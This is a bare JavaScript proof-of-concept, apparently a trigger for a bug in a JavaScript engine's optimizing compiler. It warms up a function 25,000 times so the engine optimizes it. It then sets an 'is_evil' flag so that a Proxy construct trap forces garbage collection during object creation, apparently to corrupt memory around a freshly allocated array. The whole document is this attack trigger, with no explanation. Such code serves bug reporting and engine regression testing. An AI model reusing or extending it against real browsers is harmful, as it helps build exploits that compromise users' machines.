let is_evil = false;

function trigger_gc() {
    for (let i = 0; i < 50; i++) {
        new Array(20000);
    }
}

class MyClass {}

const P = new Proxy(MyClass, {
    construct: function(target, args) {
        if (is_evil) {
            trigger_gc();
        }
        return new target(...args);
    }
});

function poc_func() {
    new P();
    const arr = [1.1, 2.2, 3.3, 4.4];
    return arr;
}

for (let i = 0; i < 25000; ++i) {
    poc_func();
}

is_evil = true;
poc_func();